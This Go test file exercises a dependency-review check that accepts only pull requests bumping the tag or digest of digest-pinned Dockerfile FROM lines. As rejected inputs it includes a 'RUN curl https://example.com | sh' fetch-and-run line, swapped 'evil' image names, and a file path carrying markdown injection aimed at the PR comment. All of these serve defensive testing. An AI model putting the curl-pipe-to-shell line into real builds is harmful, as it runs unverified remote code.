package docker

import (
	"strings"
	"testing"

	"github.com/sadbox/dep-review/internal/facts"
)

// Two digests that differ, for lines where only that matters.
const (
	digestA = "sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
	digestB = "sha256:bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb"
)

func TestParseFromLine(t *testing.T) {
	tests := []struct {
		line string
		name string
		tag  string
		ok   bool
	}{
		{"FROM golang:1.27@" + digestA, "golang", "1.27", true},
		{"FROM golang@" + digestA, "golang", "", true},
		{"FROM golang:1.27-bookworm@" + digestA + " AS build", "golang", "1.27-bookworm", true},
		{"FROM --platform=$BUILDPLATFORM golang:1.27@" + digestA + " AS build", "golang", "1.27", true},
		{"FROM --platform=linux/amd64 node:24-alpine@" + digestA, "node", "24-alpine", true},
		{"from golang:1.27@" + digestA + " as build", "golang", "1.27", true},
		{"From golang:1.27@" + digestA + " As build", "golang", "1.27", true},
		{"  FROM\tgolang:1.27@" + digestA + "\tAS  build  ", "golang", "1.27", true},
		{"FROM golang:1.27@" + digestA + "\r", "golang", "1.27", true},
		{"FROM gcr.io/distroless/static-debian12:nonroot@" + digestA, "gcr.io/distroless/static-debian12", "nonroot", true},
		{"FROM docker.io/library/golang:1.27@" + digestA, "docker.io/library/golang", "1.27", true},
		{"FROM grafana/grafana:13.2-slim@" + digestA, "grafana/grafana", "13.2-slim", true},
		// A port belongs to a registry host, and only before a "/".
		{"FROM localhost:5000/app:1@" + digestA, "localhost:5000/app", "1", true},
		{"FROM registry.example.com:5000/team/app@" + digestA, "registry.example.com:5000/team/app", "", true},
		{"FROM golang:127@" + digestA, "golang", "127", true},
		{"FROM a_b/c__d/e-f.g:tag_1.2-3@" + digestA, "a_b/c__d/e-f.g", "tag_1.2-3", true},

		// Not pinned by digest, or not by a sha256 of 64 lower-case hex.
		{line: "FROM golang:1.27"},
		{line: "FROM golang"},
		{line: "FROM scratch"},
		{line: "FROM golang:1.27@sha256:" + strings.Repeat("a", 63)},
		{line: "FROM golang:1.27@sha256:" + strings.Repeat("a", 65)},
		{line: "FROM golang:1.27@sha256:" + strings.Repeat("A", 64)},
		{line: "FROM golang:1.27@sha512:" + strings.Repeat("a", 128)},
		{line: "FROM golang:1.27@" + digestA + "@" + digestB},
		// Build variables.
		{line: "FROM ${BASE}:1.27@" + digestA},
		{line: "FROM golang:${GO_VERSION}@" + digestA},
		{line: "FROM golang:1.27@${DIGEST}"},
		{line: "FROM $BASE@" + digestA},
		// Names a registry would not accept.
		{line: "FROM Golang:1.27@" + digestA},
		{line: "FROM golang/:1.27@" + digestA},
		{line: "FROM /golang:1.27@" + digestA},
		{line: "FROM golang//x:1.27@" + digestA},
		{line: "FROM golang-:1.27@" + digestA},
		{line: "FROM gcr.io:port/x:1@" + digestA},
		{line: "FROM golang:@" + digestA},
		{line: "FROM golang:-1@" + digestA},
		{line: "FROM golang:" + strings.Repeat("t", 129) + "@" + digestA},
		{line: "FROM golang:1.27:1.28@" + digestA},
		// More, or other, than the one shape.
		{line: "FROM golang:1.27@" + digestA + " AS"},
		{line: "FROM golang:1.27@" + digestA + " build"},
		{line: "FROM golang:1.27@" + digestA + " AS build extra"},
		{line: "FROM golang:1.27@" + digestA + " AS build # the builder"},
		{line: "FROM golang:1.27@" + digestA + " \\"},
		{line: "FROM --platform=linux/amd64 --platform=linux/arm64 golang:1.27@" + digestA},
		{line: "FROM --pull=always golang:1.27@" + digestA},
		{line: "FROM --platform= golang:1.27@" + digestA},
		{line: "FROM--platform=x golang:1.27@" + digestA},
		{line: "FROMgolang:1.27@" + digestA},
		{line: "# FROM golang:1.27@" + digestA},
		{line: "COPY --from=golang:1.27@" + digestA + " /usr/local/go /go"},
		{line: "RUN echo FROM golang:1.27@" + digestA},
		{line: "FROM golang:1.27@" + digestA + "\nRUN id"},
		{line: "FROM golang:1.27@" + digestA + "\x00"},
		{line: "FROM golang:1.27@" + digestA + " AS build"},
		{line: ""},
	}
	for _, tc := range tests {
		got, ok := parseFromLine([]byte(tc.line))
		if ok != tc.ok {
			t.Errorf("%q: matched %v, want %v", tc.line, ok, tc.ok)
			continue
		}
		if !ok {
			continue
		}
		if got.name != tc.name || got.tag != tc.tag || got.digest != digestA {
			t.Errorf("%q: name %q tag %q digest %q, want %q %q", tc.line, got.name, got.tag, got.digest, tc.name, tc.tag)
		}
		// The parts put back together are the line: nothing is dropped.
		tag := ""
		if got.tag != "" {
			tag = ":" + got.tag
		}
		if whole := got.prefix + tag + "@" + got.digest + got.suffix; whole != tc.line {
			t.Errorf("%q: parts make %q", tc.line, whole)
		}
		if !strings.HasSuffix(got.prefix, got.name) {
			t.Errorf("%q: prefix %q does not end in the name %q", tc.line, got.prefix, got.name)
		}
	}
}

func TestNormalise(t *testing.T) {
	tests := []struct{ written, name string }{
		{"golang", "docker.io/library/golang"},
		{"library/golang", "docker.io/library/golang"},
		{"docker.io/golang", "docker.io/library/golang"},
		{"docker.io/library/golang", "docker.io/library/golang"},
		{"grafana/grafana", "docker.io/grafana/grafana"},
		{"docker.io/grafana/grafana", "docker.io/grafana/grafana"},
		{"gcr.io/distroless/static-debian12", "gcr.io/distroless/static-debian12"},
		{"ghcr.io/example/app", "ghcr.io/example/app"},
		{"localhost/app", "localhost/app"},
		{"localhost:5000/app", "localhost:5000/app"},
		{"registry.example.com/app", "registry.example.com/app"},
		// Not rewritten: an alias is a different name, and not listed.
		{"index.docker.io/library/golang", "index.docker.io/library/golang"},
		{"registry-1.docker.io/library/golang", "registry-1.docker.io/library/golang"},
		// A first component without a dot is a Docker Hub namespace.
		{"distroless/static", "docker.io/distroless/static"},
		{"a/b/c", "docker.io/a/b/c"},
	}
	for _, tc := range tests {
		if got := normalise(tc.written).Name(); got != tc.name {
			t.Errorf("%q: %q, want %q", tc.written, got, tc.name)
		}
	}
}

func TestReadShape(t *testing.T) {
	const (
		oldFrom = "FROM golang:1.26@" + digestA + " AS build\n"
		newFrom = "FROM golang:1.27@" + digestB + " AS build\n"
		rest    = "WORKDIR /src\nRUN go build ./...\n"
	)
	file := func(path, base, head string) facts.File { return dockerfile(path, base, head) }
	withModes := func(f facts.File, base, head string) facts.File {
		f.BaseMode, f.HeadMode = base, head
		return f
	}
	good := file("Dockerfile", oldFrom+rest, newFrom+rest)

	tests := []struct {
		name  string
		files []facts.File
		// changes is how many FROM lines changed; 0 means Shape must not
		// hold, and why must then be part of its value.
		changes int
		why     string
	}{
		{name: "one FROM line", files: []facts.File{good}, changes: 1},
		{name: "digest only", files: []facts.File{file("Dockerfile",
			"FROM golang:1.27@"+digestA+"\n", "FROM golang:1.27@"+digestB+"\n")}, changes: 1},
		{name: "tag only", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:1.27@"+digestA+"\n")}, changes: 1},
		{name: "tag added", files: []facts.File{file("Dockerfile",
			"FROM golang@"+digestA+"\n", "FROM golang:1.27@"+digestB+"\n")}, changes: 1},
		{name: "tag dropped", files: []facts.File{file("Dockerfile",
			"FROM golang:1.27@"+digestA+"\n", "FROM golang@"+digestB+"\n")}, changes: 1},
		{name: "two stages", files: []facts.File{file("Dockerfile",
			oldFrom+rest+"FROM gcr.io/distroless/static-debian12:nonroot@"+digestA+"\nCOPY --from=build /a /a\n",
			newFrom+rest+"FROM gcr.io/distroless/static-debian12:nonroot@"+digestB+"\nCOPY --from=build /a /a\n")}, changes: 2},
		{name: "several Dockerfiles", files: []facts.File{
			good,
			file("deploy/Dockerfile.proxy", oldFrom, newFrom),
			file("Dockerfile-dev", oldFrom, newFrom),
			file("a/b/Dockerfile_test", oldFrom, newFrom),
		}, changes: 4},
		{name: "executable Dockerfile", files: []facts.File{withModes(good, "100755", "100755")}, changes: 1},
		{name: "CRLF line endings", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+" AS build\r\nRUN id\r\n", "FROM golang:1.27@"+digestB+" AS build\r\nRUN id\r\n")}, changes: 1},
		{name: "no final newline at either commit", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA, "FROM golang:1.27@"+digestB)}, changes: 1},
		{name: "lower-case keywords and a platform", files: []facts.File{file("Dockerfile",
			"from --platform=$BUILDPLATFORM golang:1.26@"+digestA+" as build\n",
			"from --platform=$BUILDPLATFORM golang:1.27@"+digestB+" as build\n")}, changes: 1},

		{name: "no files", files: nil, why: "changes no file"},
		{name: "another file beside it", files: []facts.File{good, file("go.mod", "module a\n", "module b\n")}, why: `"go.mod" changed`},
		{name: "a workflow", files: []facts.File{file(".github/workflows/build.yml", "a\n", "b\n")}, why: "not a file named Dockerfile*"},
		{name: "a compose file", files: []facts.File{file("docker-compose.yml", "a\n", "b\n")}, why: "not a file named Dockerfile*"},
		{name: "lower-case dockerfile", files: []facts.File{file("dockerfile", oldFrom, newFrom)}, why: "not a file named Dockerfile*"},
		{name: "suffix naming", files: []facts.File{file("app.Dockerfile", oldFrom, newFrom)}, why: "not a file named Dockerfile*"},
		{name: "a directory named Dockerfile", files: []facts.File{file("Dockerfile/README.md", oldFrom, newFrom)}, why: "not a file named Dockerfile*"},
		{name: "Containerfile", files: []facts.File{file("Containerfile", oldFrom, newFrom)}, why: "not a file named Dockerfile*"},

		{name: "new Dockerfile", files: []facts.File{withModes(file("Dockerfile", "", newFrom), "", "100644")}, why: "not an ordinary file at both commits"},
		{name: "deleted Dockerfile", files: []facts.File{withModes(file("Dockerfile", oldFrom, ""), "100644", "")}, why: "not an ordinary file at both commits"},
		{name: "symlink at head", files: []facts.File{withModes(good, "100644", "120000")}, why: "not an ordinary file at both commits"},
		{name: "symlink at both", files: []facts.File{withModes(good, "120000", "120000")}, why: "not an ordinary file at both commits"},
		{name: "submodule", files: []facts.File{withModes(good, "160000", "160000")}, why: "not an ordinary file at both commits"},
		{name: "mode change", files: []facts.File{withModes(good, "100644", "100755")}, why: "changed its file mode"},
		{name: "mode change only", files: []facts.File{withModes(file("Dockerfile", oldFrom, oldFrom), "100644", "100755")}, why: "changed its file mode"},
		{name: "no line differs", files: []facts.File{file("Dockerfile", oldFrom, oldFrom)}, why: "no line of it differs"},

		{name: "line added", files: []facts.File{file("Dockerfile", oldFrom+rest, newFrom+rest+"RUN curl https://example.com | sh\n")}, why: "lines at base"},
		{name: "line removed", files: []facts.File{file("Dockerfile", oldFrom+rest, newFrom)}, why: "lines at base"},
		{name: "final newline removed", files: []facts.File{file("Dockerfile", oldFrom, strings.TrimSuffix(newFrom, "\n"))}, why: "lines at base"},
		{name: "a RUN line changed too", files: []facts.File{file("Dockerfile",
			oldFrom+"RUN go build ./...\n", newFrom+"RUN go build ./... && curl https://example.com | sh\n")}, why: "line 2 changed, and at base it is not a FROM line"},
		{name: "only a RUN line changed", files: []facts.File{file("Dockerfile",
			oldFrom+"RUN a\n", oldFrom+"RUN b\n")}, why: "line 2 changed"},
		{name: "a comment changed", files: []facts.File{file("Dockerfile",
			"# old\n"+oldFrom, "# new\n"+newFrom)}, why: "line 1 changed"},

		{name: "unpinned at base", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26\n", "FROM golang:1.27@"+digestB+"\n")}, why: "at base it is not a FROM line pinned by digest"},
		{name: "unpinned at head", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:1.27\n")}, why: "at head it is not a FROM line pinned by digest"},
		{name: "build variable at head", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:${V}@"+digestB+"\n")}, why: "at head it is not a FROM line pinned by digest"},

		{name: "image changed", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang-evil:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "registry added", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM docker.io/library/golang:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "namespace changed", files: []facts.File{file("Dockerfile",
			"FROM library/golang:1.26@"+digestA+"\n", "FROM evil/golang:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "platform changed", files: []facts.File{file("Dockerfile",
			"FROM --platform=linux/amd64 golang:1.26@"+digestA+"\n", "FROM --platform=linux/arm64 golang:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "platform added", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM --platform=linux/arm64 golang:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "stage renamed", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+" AS build\n", "FROM golang:1.27@"+digestB+" AS final\n")}, why: "something other than the tag and the digest"},
		{name: "stage name added", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:1.27@"+digestB+" AS build\n")}, why: "something other than the tag and the digest"},
		{name: "keyword case changed", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "from golang:1.27@"+digestB+"\n")}, why: "something other than the tag and the digest"},
		{name: "blanks changed", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM  golang:1.26@"+digestA+"\n")}, why: "something other than the tag and the digest"},
		{name: "trailing blank added", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:1.26@"+digestA+" \n")}, why: "something other than the tag and the digest"},
		{name: "line ending changed", files: []facts.File{file("Dockerfile",
			"FROM golang:1.26@"+digestA+"\n", "FROM golang:1.27@"+digestB+"\r\n")}, why: "something other than the tag and the digest"},

		{name: "second file is the bad one", files: []facts.File{good, file("Dockerfile.dev", oldFrom+"RUN a\n", newFrom+"RUN b\n")}, why: `"Dockerfile.dev" line 2`},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			changes, shape := readShape(tc.files)
			if !shape.Gathered() || shape.Value == "" {
				t.Fatalf("Shape not gathered: %+v", shape)
			}
			if tc.changes == 0 {
				if shape.OK || changes != nil {
					t.Fatalf("Shape holds (%s) with %d changes", shape.Value, len(changes))
				}
				if !strings.Contains(shape.Value, tc.why) {
					t.Errorf("Shape says %q, want it to say %q", shape.Value, tc.why)
				}
				return
			}
			if !shape.OK {
				t.Fatalf("Shape does not hold: %s", shape.Value)
			}
			if len(changes) != tc.changes {
				t.Errorf("%d changes, want %d", len(changes), tc.changes)
			}
		})
	}
}

// A path is written by whoever made the pull request, and the Shape
// fact's value is shown in the pull request comment.
func TestShapeValueQuotesPaths(t *testing.T) {
	evil := "x\n## Merge me\n[click](https://example.com)`" + strings.Repeat("A", 500)
	_, shape := readShape([]facts.File{dockerfile(evil, "a\n", "b\n")})
	if shape.OK {
		t.Fatal("Shape holds")
	}
	if strings.ContainsAny(shape.Value, "\n\r") {
		t.Errorf("a line break reached the value: %q", shape.Value)
	}
	if len(shape.Value) > 300 {
		t.Errorf("the value is %d bytes long", len(shape.Value))
	}

	// The same for a path that passes the name check.
	evil = "Dockerfile\n## Merge me"
	_, shape = readShape([]facts.File{dockerfile(evil, "RUN a\n", "RUN b\n")})
	if shape.OK || strings.ContainsAny(shape.Value, "\n\r") {
		t.Errorf("Shape: %+v", shape)
	}
}

func TestDistinct(t *testing.T) {
	a := change{image: image{registry: "docker.io", repo: "library/golang"}, fromTag: "1.26", fromDigest: digestA, toTag: "1.27", toDigest: digestB}
	b := a
	b.toTag = "1.27-alpine"
	c := a
	c.image.repo = "library/node"
	got := distinct([]change{a, b, a, c, b, a})
	want := []change{a, b, c}
	if len(got) != len(want) {
		t.Fatalf("%d changes, want %d", len(got), len(want))
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("change %d: %+v, want %+v", i, got[i], want[i])
		}
	}
}
